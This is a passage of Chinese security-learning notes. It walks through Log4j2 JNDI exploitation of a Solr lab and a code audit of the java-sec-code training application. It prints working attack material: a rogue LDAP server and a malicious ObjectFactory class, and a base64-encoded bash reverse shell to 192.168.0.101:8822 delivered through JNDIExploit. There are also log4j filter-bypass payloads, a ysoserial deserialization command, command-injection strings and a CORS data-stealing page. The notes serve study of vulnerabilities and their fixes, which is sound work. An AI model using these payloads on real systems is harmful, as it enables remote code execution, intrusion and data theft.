import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
public class Ldapserver {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main(String[] argsx) {
        String[] args = new String[]{"http://127.0.0.1/#Evil", "9999"};
        int port = 0;
        if (args.length < 1 || args[0].indexOf('#') < 0) {
            System.err.println(com.test.Ldapserver.class.getSimpleName() + " <codebase_url#classname> [<port>]"); //$NON-NLS-1$
            System.exit(-1);
        } else if (args.length > 1) {
            port = Integer.parseInt(args[1]);
        }

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            } catch (Exception e1) {
                e1.printStackTrace();
            }

        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if (refPos > 0) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```

恶意类:

- 恶意代码最终需要⽣成⼀个class⽂件，因此这段代码不能依赖别的外部代码，所有代码必须写进⼀个java⽂件
- 不⽤写package信息 
- 该类必须实现javax.naming.spi.ObjectFactory接⼝

```java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;
public class Evil implements ObjectFactory {
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        Runtime.getRuntime().exec("calc");
        return null;
    }
}
```

客户端访问:

```java
import javax.naming.InitialContext;
import javax.naming.NamingException;
public class Ldapclient {
    public static void main(String[] args) throws NamingException {
        //指定RMI服务资源的标识
        String jndi_uri = "ldap://127.0.0.1:9999/Evil";
        //构建jndi上下文环境
        InitialContext initialContext = new InitialContext();
        //查找标识关联的RMI服务
        initialContext.lookup(jndi_uri);
    }
}
```

<img src=".\图片\Snipaste_2023-03-14_14-06-57.png" alt="Snipaste_2023-03-14_14-06-57" style="zoom: 67%;" />

## log4j2 JNDI LDAP加载恶意类

jdk⾼版本 需要 开启 `System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");`

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
public class Log4j2Test {
    private static  final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
      //  logger.error("${jndi:rmi://${hostName}.0vww5i.dnslog.cn/xxx}");
//        logger.error("${jndi:rmi://127.0.0.1:6666/obj}");
        logger.error("${jndi:ldap://127.0.0.1:9999/Evil}");

    }
}
```

<img src=".\图片\Snipaste_2023-03-14_14-10-03.png" alt="Snipaste_2023-03-14_14-10-03" style="zoom: 50%;" />

## Log4j2 实战

环境：vulhub

### DNSLOG验证

```
http://192.168.0.103:8983/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.ude3eh.dnslog.cn}
```

<img src=".\图片\Snipaste_2023-03-14_14-47-30.png" alt="Snipaste_2023-03-14_14-47-30" style="zoom:67%;" />

<img src=".\图片\Snipaste_2023-03-14_14-47-44.png" alt="Snipaste_2023-03-14_14-47-44" style="zoom:67%;" />

### 反弹shell

JNDIExploit 开启ldap服务

```
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.0.101
```

访问⽹站 ⽣成反弹shell 选择base64编码

https://www.revshells.com/  192.168.0.101 8822

```
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMC4xMDEvODgyMiAwPiYx
```

JNDIExploit 使用规则，默认端口 1389

```
${jndi:ldap://192.168.0.101:1389/TomcatBypass/Command/Base64/L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMC4xMDEvODgyMiAwPiYx}
```

以上再使用 url 编码

```
%24%7Bjndi%3Aldap%3A%2F%2F192.168.0.101%3A1389%2FTomcatBypass%2FCommand%2FBase64%2FL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMC4xMDEvODgyMiAwPiYx%7D
```

发送

```
http://192.168.0.103:8983/solr/admin/cores?action=%24%7Bjndi%3Aldap%3A%2F%2F192.168.0.101%3A1389%2FTomcatBypass%2FCommand%2FBase64%2FL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMC4xMDEvODgyMiAwPiYx%7D
```

攻击机监听

```
nc.exe -lvnp 8822
```

返回了shell

### 绕过bypass：

```
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-
i}://asdasd.asdasd.asdasd/poc}
${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
${jndi:rmi://adsasd.asdasd.asdasd}
${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc
}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxx
xx.xx/poc}
```

# 代码审计

## java-sec-code

环境： https://github.com/JoyChou93/java-sec-code

### RCE

#### Runtime

主要漏洞代码

```java
@GetMapping("/runtime/exec")
public String CommandExec(String cmd) {
    Runtime run = Runtime.getRuntime();
    StringBuilder sb = new StringBuilder();

    try {
        Process p = run.exec(cmd);
        BufferedInputStream in = new BufferedInputStream(p.getInputStream());
        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
        String tmpStr;

        while ((tmpStr = inBr.readLine()) != null) {
            sb.append(tmpStr);
        }

        if (p.waitFor() != 0) {
            if (p.exitValue() == 1)
                return "Command exec failed!!";
        }

        inBr.close();
        in.close();
    } catch (Exception e) {
        return e.toString();
    }
    return sb.toString();
}
```

payload：

```
http://127.0.0.1:8080/rce/runtime/exec?cmd=whoami
```

<img src=".\图片\Snipaste_2023-03-15_14-55-53.png" alt="Snipaste_2023-03-15_14-55-53" style="zoom:67%;" />

#### ProcessBuilder

与Runtime类似，主要漏洞代码：

```java
@GetMapping("/ProcessBuilder")
public String processBuilder(String cmd) {

    StringBuilder sb = new StringBuilder();

    try {
        //String[] arrCmd = {"/bin/sh", "-c", cmd};
        String[] arrCmd = {"cmd", "/c", cmd};
        ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
        Process p = processBuilder.start();
        BufferedInputStream in = new BufferedInputStream(p.getInputStream());
        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
        String tmpStr;

        while ((tmpStr = inBr.readLine()) != null) {
            sb.append(tmpStr);
        }
    } catch (Exception e) {
        return e.toString();
    }
    return sb.toString();
}
```

payload：

```
http://localhost:8080/rce/ProcessBuilder?cmd=whoami
```

<img src=".\图片\Snipaste_2023-03-15_14-58-18.png" alt="Snipaste_2023-03-15_14-58-18" style="zoom:67%;" />

#### JSCmd

远程加载恶意 `js` 文件并且执行，漏洞主要代码：

```java
@GetMapping("/jscmd")
public void jsEngine(String jsurl) throws Exception{
    // js nashorn javascript ecmascript
    ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
    Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
    String cmd = String.format("load(\"%s\")", jsurl);
    engine.eval(cmd, bindings);
}
```

恶意 `js` 文件代码：

```js
var a = mainOutput(); 
function mainOutput() 
{ 
    var x=java.lang.Runtime.getRuntime().exec("calc");
}
```

开启一个小型 web 服务器 `python -m http.server 7777`，把恶意 JS 代码放在服务器上，等待触发执行

触发链接：`http://localhost:8080/rce/jscmd?jsurl=http://127.0.0.1:7777/calc.js`

效果如下：

<img src=".\图片\Snipaste_2023-03-15_15-07-47.png" alt="Snipaste_2023-03-15_15-07-47" style="zoom:67%;" />

#### Groovy

一种新的命令执行方式，主要漏洞代码如下：

```java
@GetMapping("groovy")
public void groovyshell(String content) {
    GroovyShell groovyShell = new GroovyShell();
    groovyShell.evaluate(content);
}
```

触发链接：`http://localhost:8080/rce/groovy?content="calc".execute()`

<img src=".\图片\Snipaste_2023-03-15_15-10-21.png" alt="Snipaste_2023-03-15_15-10-21" style="zoom:67%;" />

#### Yaml执行

```java
/**
 * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
 * yaml-payload.jar: https://github.com/artsploit/yaml-payload
 *
 * @param content payloads
 */
@GetMapping("/vuln/yarm")
public void yarm(String content) {
    Yaml y = new Yaml();  //不安全
    y.load(content);
}

@GetMapping("/sec/yarm")
public void secYarm(String content) {
    Yaml y = new Yaml(new SafeConstructor()); //安全
    y.load(content);
}
```

把 `yaml-payload` 打包成 `JAR` 包 ,再放 VPS 上远程执行

### CommandInject

#### 前置

<img src=".\图片\Snipaste_2023-03-15_15-21-43.png" alt="Snipaste_2023-03-15_15-21-43" style="zoom: 67%;" />

执行命令时试试拼接命令，用符号 `&&` `&` `|` `||`等试试

```
dir E:\java&calc
dir E:\java&&calc
dir E:\java|calc
dir E:\java||calc
```

#### CodeInject

主要漏洞代码：

```java
@GetMapping("/codeinject")
public String codeInject(String filepath) throws IOException {

    //String[] cmdList = new String[]{"sh", "-c", "ls -la " + filepath};
    String[] cmdList = new String[]{"cmd", "/c", "dir " + filepath};
    ProcessBuilder builder = new ProcessBuilder(cmdList);
    builder.redirectErrorStream(true);
    Process process = builder.start();
    return WebUtils.convertStreamToString(process.getInputStream()); //回显结果
}
```

触发漏洞：`http://localhost:8080/codeinject?filepath=E%3A%5Cjava%26calc`  ，注意把 `E:\java&calc` URL 编码为  `E%3A%5Cjava%26calc`

<img src=".\图片\Snipaste_2023-03-15_15-26-53.png" alt="Snipaste_2023-03-15_15-26-53" style="zoom:67%;" />

#### Host

主要漏洞代码：

```java
@GetMapping("/codeinject/host")
public String codeInjectHost(HttpServletRequest request) throws IOException {

    String host = request.getHeader("host");
    logger.info(host);
    //String[] cmdList = new String[]{"sh", "-c", "curl " + host};
    String[] cmdList = new String[]{"cmd", "/c", "curl " + host};
    ProcessBuilder builder = new ProcessBuilder(cmdList);
    builder.redirectErrorStream(true);
    Process process = builder.start();
    return WebUtils.convertStreamToString(process.getInputStream());
}
```

在请求头的 host 字段中加入恶意字符：  `hacked by joychou&whoami`

<img src=".\图片\Snipaste_2023-03-15_15-41-48.png" alt="Snipaste_2023-03-15_15-41-48" style="zoom:80%;" />

#### 修复

增加过滤：

```java
@GetMapping("/codeinject/sec")
public String codeInjectSec(String filepath) throws IOException {
    String filterFilePath = SecurityUtil.cmdFilter(filepath); //过滤函数
    if (null == filterFilePath) {
        return "Bad boy. I got u.";
    }
    //String[] cmdList = new String[]{"sh", "-c", "ls -la " + filterFilePath};
    String[] cmdList = new String[]{"cmd", "/c", "dir " + filterFilePath};
    ProcessBuilder builder = new ProcessBuilder(cmdList);
    builder.redirectErrorStream(true);
    Process process = builder.start();
    return WebUtils.convertStreamToString(process.getInputStream());
}
```

过滤函数：

<img src=".\图片\Snipaste_2023-03-15_15-44-15.png" alt="Snipaste_2023-03-15_15-44-15" style="zoom:67%;" />



<img src=".\图片\Snipaste_2023-03-15_15-44-29.png" alt="Snipaste_2023-03-15_15-44-29" style="zoom:67%;" />

### Cookie

```java
package org.joychou.controller;
import org.springframework.web.bind.annotation.CookieValue;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import org.joychou.util.WebUtils;
import org.springframework.web.bind.annotation.RestController;
import static org.springframework.web.util.WebUtils.getCookie;

/**
 * 某些应用获取用户身份信息可能会直接从cookie中直接获取明文的nick或者id，导致越权问题。
 */
@RestController
@RequestMapping("/cookie")
public class Cookies {

    private static String NICK = "nick";

    @GetMapping(value = "/vuln01")
    public String vuln01(HttpServletRequest req) {
        String nick = WebUtils.getCookieValueByName(req, NICK); // key code
        return "Cookie nick: " + nick;
    }

    @GetMapping(value = "/vuln02")
    public String vuln02(HttpServletRequest req) {
        String nick = null;
        Cookie[] cookie = req.getCookies();

        if (cookie != null) {
            nick = getCookie(req, NICK).getValue();  // key code
        }

        return "Cookie nick: " + nick;
    }

    @GetMapping(value = "/vuln03")
    public String vuln03(HttpServletRequest req) {
        String nick = null;
        Cookie cookies[] = req.getCookies();
        if (cookies != null) {
            for (Cookie cookie : cookies) {
                // key code. Equals can also be equalsIgnoreCase.
                if (NICK.equals(cookie.getName())) {
                    nick = cookie.getValue();
                }
            }
        }
        return "Cookie nick: " + nick;
    }

    @GetMapping(value = "/vuln04")
    public String vuln04(HttpServletRequest req) {
        String nick = null;
        Cookie cookies[] = req.getCookies();
        if (cookies != null) {
            for (Cookie cookie : cookies) {
                if (cookie.getName().equalsIgnoreCase(NICK)) {  // key code
                    nick = cookie.getValue();
                }
            }
        }
        return "Cookie nick: " + nick;
    }

    @GetMapping(value = "/vuln05")
    public String vuln05(@CookieValue("nick") String nick) {
        return "Cookie nick: " + nick;
    }

    @GetMapping(value = "/vuln06")
    public String vuln06(@CookieValue(value = "nick") String nick) {
        return "Cookie nick: " + nick;
    }
}
```

某些应用获取用户身份信息可能会直接从cookie中直接获取明文的nick或者id，导致越权问题

<img src=".\图片\Snipaste_2023-03-15_16-24-13.png" alt="Snipaste_2023-03-15_16-24-13" style="zoom: 80%;" />

### CORS

#### 漏洞利用技巧

在之前我们了解了一些关于CORS跨域资源共享通信的一些字段含义，
CORS的漏洞主要看当我们发起的请求中带有Origin头部字段时，服务器的返回包带有CORS的相关字段并且允许Origin的域访问。
一般测试WEB漏洞都会用上BurpSuite，而BurpSuite可以实现帮助我们检测这个漏洞。

首先是自动在HTTP请求包中加上Origin的头部字段，打开BurpSuite，选择Proxy模块中的Options选项，找到Match and Replace这一栏，勾选Request header 将空替换为Origin:example.com的Enable框。
当我们进行测试时，看服务器响应头字段里可以关注这几个点：
`最好利用的配置：`
Access-Control-Allow-Origin: [https://attacker.com](https://attacker.com/)
Access-Control-Allow-Credentials: true
`可能存在可利用的配置：`
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
`很好的条件但无法利用：`
下面这组配置组合虽然看起来很完美但是CORS机制已经默认自动禁止了这种组合，算是CORS的最后一道防线
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
`单一的情况`
Access-Control-Allow-Origin：*

**总结漏洞的原因：**

1：CORS服务端的 Access-Control-Allow-Origin 设置为了 *，并且 Access-Control-Allow-Credentials 设置为false，这样任何网站都可以获取该服务端的任何数据了。

2：**有一些网站的Access-Control-Allow-Origin他的设置并不是固定的，而是根据用户跨域请求数据的Origin来定的**。这时，不管Access-Control-Allow-Credentials 设置为了 true 还是 false。任何网站都可以发起请求，并读取对这些请求的响应。意思就是任何一个网站都可以发送跨域请求来获得CORS服务端上的数据。

#### /vuln/origin

重要代码：

<img src=".\图片\Snipaste_2023-03-16_16-21-35.png" alt="Snipaste_2023-03-16_16-21-35" style="zoom:80%;" />

代码中 `Access-Control-Allow-Origin` 的值是用户请求时发送的 `Origin` 字段来控制的，我们可以把这个字段改为任意黑客自己的域名。或者直接不加 `Origin` 字段，这样 `Access-Control-Allow-Origin` 的值为 `null`

<img src=".\图片\Snipaste_2023-03-16_16-26-20.png" alt="Snipaste_2023-03-16_16-26-20" style="zoom: 80%;" />

利用：

我们构造恶意 `corsexp.html` 访问

```html
<!DOCTYPE html>
<html>
<head>
 <title>cors exp</title>
</head>
<body>
<script type="text/javascript">
function cors() {  
var xhttp = new XMLHttpRequest();  
xhttp.onreadystatechange = function() {    
    if (this.status == 200) {    
    alert(this.responseText);     
    document.getElementById("demo").innerHTML = this.responseText;    
    }  
};  
xhttp.open("GET", "http://127.0.0.1:8080/cors/vuln/origin");  
xhttp.withCredentials = true;  
xhttp.send();
}
cors();
</script>
</body>
</html>
```

于是就接收到了重要信息：

<img src=".\图片\Snipaste_2023-03-16_16-29-29.png" alt="Snipaste_2023-03-16_16-29-29" style="zoom:67%;" />

#### /vuln/setHeader

重要部分代码：

```java
private static String info = "{\"name\": \"JoyChou\", \"phone\": \"18200001111\"}";

@GetMapping("/vuln/setHeader")
public String vuls2(HttpServletResponse response) {
    // 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常
    response.setHeader("Access-Control-Allow-Origin", "*");
    return info;
}
```

Access-Control-Allow-Origin 为 * 固定写死了，我们按照以上思路构造恶意 `corsexp.html` 访问，便不能得到重要信息

#### /vuln/crossOrigin

重要代码

```java
@GetMapping("*")
@RequestMapping("/vuln/crossOrigin")
public String vuls3() {
    return info;
}
```

我们按照以上思路构造恶意 `corsexp.html` 访问，也不能得到重要信息

#### 合理写法

```java
/**
 * 重写Cors的checkOrigin校验方法
 * 支持自定义checkOrigin，让其额外支持一级域名
 * 代码：org/joychou/security/CustomCorsProcessor
 */
@CrossOrigin(origins = {"joychou.org", "http://test.joychou.me"})
@GetMapping("/sec/crossOrigin")
public String secCrossOrigin() {
    return info;
}


/**
 * WebMvcConfigurer设置Cors
 * 支持自定义checkOrigin
 * 代码：org/joychou/config/CorsConfig.java
 */
@GetMapping("/sec/webMvcConfigurer")
public CsrfToken getCsrfToken_01(CsrfToken token) {
    return token;
}


/**
 * spring security设置cors
 * 不支持自定义checkOrigin，因为spring security优先于setCorsProcessor执行
 * 代码：org/joychou/security/WebSecurityConfig.java
 */
@GetMapping("/sec/httpCors")
public CsrfToken getCsrfToken_02(CsrfToken token) {
    return token;
}


/**
 * 自定义filter设置cors
 * 支持自定义checkOrigin
 * 代码：org/joychou/filter/OriginFilter.java
 */
@GetMapping("/sec/originFilter")
public CsrfToken getCsrfToken_03(CsrfToken token) {
    return token;
}


/**
 * CorsFilter设置cors。
 * 不支持自定义checkOrigin，因为corsFilter优先于setCorsProcessor执行
 * 代码：org/joychou/filter/BaseCorsFilter.java
 */
@RequestMapping("/sec/corsFilter")
public CsrfToken getCsrfToken_04(CsrfToken token) {
    return token;
}


@GetMapping("/sec/checkOrigin")
public String seccode(HttpServletRequest request, HttpServletResponse response) {
    String origin = request.getHeader("Origin");

    // 如果origin不为空并且origin不在白名单内，认定为不安全。
    // 如果origin为空，表示是同域过来的请求或者浏览器直接发起的请求。
    if (origin != null && SecurityUtil.checkURL(origin) == null) {
        return "Origin is not safe.";
    }
    response.setHeader("Access-Control-Allow-Origin", origin);
    response.setHeader("Access-Control-Allow-Credentials", "true");
    return LoginUtils.getUserInfo2JsonStr(request);
}
```

### CSRF

重要代码：

```java
@Controller
    @RequestMapping("/csrf")
    public class CSRF {

        @GetMapping("/")
        public String index() {
            return "form";  //触发 form.html
        }

        @PostMapping("/post")
        @ResponseBody
        public String post() {
            return "CSRF passed.";
        }
}
```

form 表单：

```html
<form name="f" action="/csrf/post" method="post">
        <input type="text" name="input" />
        <input type="submit" value="Submit" />
<!--   <input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}" />-->  
    </form>
```

其中 `<input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}" />` 为 **token**  机制，可防御 `CSRF` 攻击，当我们把其注释掉时，再用 `burp` 生成 **CSRF 的 POC**：

<img src=".\图片\Snipaste_2023-03-16_17-11-19.png" alt="Snipaste_2023-03-16_17-11-19" style="zoom: 80%;" />

把这段 csrf.html **诱导已经网站登录状态的受害者访问**，发现其触发了我们伪造的 form 表单内容：

<img src=".\图片\Snipaste_2023-03-16_17-13-38.png" alt="Snipaste_2023-03-16_17-13-38" style="zoom:80%;" />

再点击 submit，触发成功，显示如下：

<img src=".\图片\Snipaste_2023-03-16_17-14-45.png" alt="Snipaste_2023-03-16_17-14-45" style="zoom:80%;" />

如果我么在 form 表单里加上  `<input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}" />`

来防御 CSRF，则我们生成的 POC 里会加上一串 **token** 导致我们利用不成功

### Deserialize

#### 利用

重要代码：

```java
@RequestMapping("/rememberMe/vuln")
public String rememberMeVul(HttpServletRequest request)
        throws IOException, ClassNotFoundException {

    Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);
    if (null == cookie) {
        return "No rememberMe cookie. Right?";
    }

    String rememberMe = cookie.getValue();  //从 cookie 获取 value 值
    byte[] decoded = Base64.getDecoder().decode(rememberMe); //base64解码rememberMe的值

    ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);
    ObjectInputStream in = new ObjectInputStream(bytes);
    in.readObject();  //触发反序列化
    in.close();

    return "Are u ok?";
}
```

代码相对来说也比较简单使用Java程序中类ObjectInputStream的 readObject方法被用来将数据流反序列化为对象，如果流中的对象 是class，则它的ObjectStreamClass描述符会被读取，并返回相应 的class对象，ObjectStreamClass包含了类的名称及 serialVersionUID。

**步骤一：**

工具 https://github.com/angelwhu/ysoserial

用 `ysoserial`  生成 poc（这里在 Linux 里执行的）：

```
java -jar ysoserial-all.jar CommonsCollections5 "cmd /c calc" | base64 -w0  
```

**步骤二：**

把上面生成的 POC 加到 COOKIE 的 rememberMe 里，注意别跟 Shiro 的 remember-me 搞混了，POC里不能有换行或者空格

<img src=".\图片\Snipaste_2023-03-17_12-11-01.png" alt="Snipaste_2023-03-17_12-11-01" style="zoom:80%;" />

#### 修复

修复方式是通过Hook resolveClass来校验反序列化的类

> 序列化数据结构可以了解到包含了类的名称及serialVersionUID 的ObjectStreamClass描述符在序列化对象流的前面位置，且在 readObject反序列化时首先会调用resolveClass读取反序列化的 类名，所以这里通过重写ObjectInputStream对象的 resolveClass方法即可实现对反序列化类的校验。这个方法最早 是由IBM的研究人员Pierre Ernst在2013年提出《Look-ahead Java deserialization》

修复代码：

```java
/**
 * Check deserialize class using black list.
 * <p>
 * http://localhost:8080/deserialize/rememberMe/security
 */
@RequestMapping("/rememberMe/security")
public String rememberMeBlackClassCheck(HttpServletRequest request)
        throws IOException, ClassNotFoundException {

    Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);

    if (null == cookie) {
        return "No rememberMe cookie. Right?";
    }
    String rememberMe = cookie.getValue();
    byte[] decoded = Base64.getDecoder().decode(rememberMe);

    ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);

    try {
        AntObjectInputStream in = new AntObjectInputStream(bytes);  // throw InvalidClassException
        in.readObject();
        in.close();
    } catch (InvalidClassException e) {
        logger.info(e.toString());
        return e.toString();
    }

    return "I'm very OK.";
}
```

### Dotall

#### 重要代码：

```java
package org.joychou.controller;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.regex.Pattern;
/**
 * Spring Security CVE-2022-22978 <p>
 * <a href="https://github.com/JoyChou93/java-sec-code/wiki/CVE-2022-22978">漏洞相关wiki</a>
 * @author JoyChou @2023-01-212
 */

public class Dotall {

    /**
     * <a href="https://github.com/spring-projects/spring-security/compare/5.5.6..5.5.7">官方spring-security修复commit记录</a>
     */
    public static void main(String[] args) throws Exception{
        Pattern vuln_pattern = Pattern.compile("/black_path.*");
        Pattern sec_pattern = Pattern.compile("/black_path.*", Pattern.DOTALL);

        String poc = URLDecoder.decode("/black_path%0a/xx", StandardCharsets.UTF_8.toString());
        System.out.println("Poc: " + poc);
        System.out.println("Not dotall: " + vuln_pattern.matcher(poc).matches());    // false，非dotall无法匹配\r\n
        System.out.println("Dotall: " + sec_pattern.matcher(poc).matches());         // true，dotall可以匹配\r\n
    }
}
```

#### 复现：

访问`http://localhost:8080/black_path`返回 `403 forbidden by JoyChou.`

<img src=".\图片\Snipaste_2023-03-17_12-22-12.png" alt="Snipaste_2023-03-17_12-22-12" style="zoom:80%;" />

访问`http://localhost:8080/black_path%0a`返回404页面。由于低版本的SpringBoot无法接收%0d和%0a路由，SpringBoot 2.7.x可接收。并且`java-sec-code`的SpringBoot版本不方便升级，所以没写`black_path`的路由，只是为了单纯证明可绕过Spring Security

<img src=".\图片\Snipaste_2023-03-17_12-22-33.png" alt="Snipaste_2023-03-17_12-22-33" style="zoom:67%;" />

#### CVE-2022-22978漏洞原理

```java
    public static void main(String[] args) throws Exception{
        Pattern vuln_pattern = Pattern.compile("/black_path.*");
        Pattern sec_pattern = Pattern.compile("/black_path.*", Pattern.DOTALL);

        String poc = URLDecoder.decode("/black_path%0a/xx", StandardCharsets.UTF_8.toString());
        System.out.println("Poc: " + poc);
        System.out.println("Not dotall: " + vuln_pattern.matcher(poc).matches());    // false，非dotall无法匹配\r\n
        System.out.println("Dotall: " + sec_pattern.matcher(poc).matches());         // true，dotall可以匹配\r\n
    }
```

返回：

```
Poc: /black_path
/xx
Not dotall: false
Dotall: true
```

### FastJson

漏洞代码：

```java
package org.joychou.controller;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
@RequestMapping("/fastjson")
public class Fastjson {

    @RequestMapping(value = "/deserialize", method = {RequestMethod.POST})
    @ResponseBody
    public String Deserialize(@RequestBody String params) {
        // 如果Content-Type不设置application/json格式，post数据会被url编码
        try {
            // 将post提交的string转换为json
            JSONObject ob = JSON.parseObject(params);
            return ob.get("name").toString();
        } catch (Exception e) {
            return e.toString();
        }
    }

    public static void main(String[] args) {  //测试 Open calc in mac
        // Open calc in mac
        String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\": [\"yv66.....gAjABAACQ==\"], \"_name\": \"lightless\", \"_tfactory\": { }, \"_outputProperties\":{ }}";
        JSON.parseObject(payload, Feature.SupportNonPublicField);
    }
}
```

#### DNSLOG测试

<img src=".\图片\Snipaste_2023-03-17_12-53-52.png" alt="Snipaste_2023-03-17_12-53-52" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-03-17_12-54-20.png" alt="Snipaste_2023-03-17_12-54-20" style="zoom:67%;" />

#### TemplatesImpl利用

参考之前篇章的    fastjon不出网利用    1、TemplatesImpl利用链

### FileUpload 

#### 任意文件上传

就是啥也没做，上传啥都行。重要代码：

```java
@GetMapping("/any")
public String index() {
    return "upload"; // return upload.html page
}
@PostMapping("/upload")
    public String singleFileUpload(@RequestParam("file") MultipartFile file,
                                   RedirectAttributes redirectAttributes) {
        if (file.isEmpty()) {
            // 赋值给uploadStatus.html里的动态参数message
            redirectAttributes.addFlashAttribute("message", "Please select a file to upload");
            return "redirect:/file/status";
        }

        try {
            // Get the file and save it somewhere
            byte[] bytes = file.getBytes();
            Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());
            Files.write(path, bytes);

            redirectAttributes.addFlashAttribute("message",
                    "You successfully uploaded '" + UPLOADED_FOLDER + file.getOriginalFilename() + "'");

        } catch (IOException e) {
            redirectAttributes.addFlashAttribute("message", "upload failed");
            logger.error(e.toString());
        }

        return "redirect:/file/status";
    }
```

#### 安全过滤上传

只允许上传图片，重要代码：

```java
@GetMapping("/pic")
public String uploadPic() {
    return "uploadPic"; // return uploadPic.html page
}
// only upload picture
    @PostMapping("/upload/picture")
    @ResponseBody
    public String uploadPicture(@RequestParam("file") MultipartFile multifile) throws Exception {
        if (multifile.isEmpty()) {
            return "Please select a file to upload";
        }

        String fileName = multifile.getOriginalFilename();
        String Suffix = fileName.substring(fileName.lastIndexOf(".")); // 获取文件后缀名
        String mimeType = multifile.getContentType(); // 获取MIME类型
        String filePath = UPLOADED_FOLDER + fileName;
        File excelFile = convert(multifile);  // 对文件名进行 uuid 操作


        // 判断文件后缀名是否在白名单内  校验1
        String[] picSuffixList = {".jpg", ".png", ".jpeg", ".gif", ".bmp", ".ico"};
        boolean suffixFlag = false;
        for (String white_suffix : picSuffixList) {
            if (Suffix.toLowerCase().equals(white_suffix)) {
                suffixFlag = true;
                break;
            }
        }
        if (!suffixFlag) {
            logger.error("[-] Suffix error: " + Suffix);
            deleteFile(filePath);
            return "Upload failed. Illeagl picture.";
        }


        // 判断MIME类型是否在黑名单内 校验2
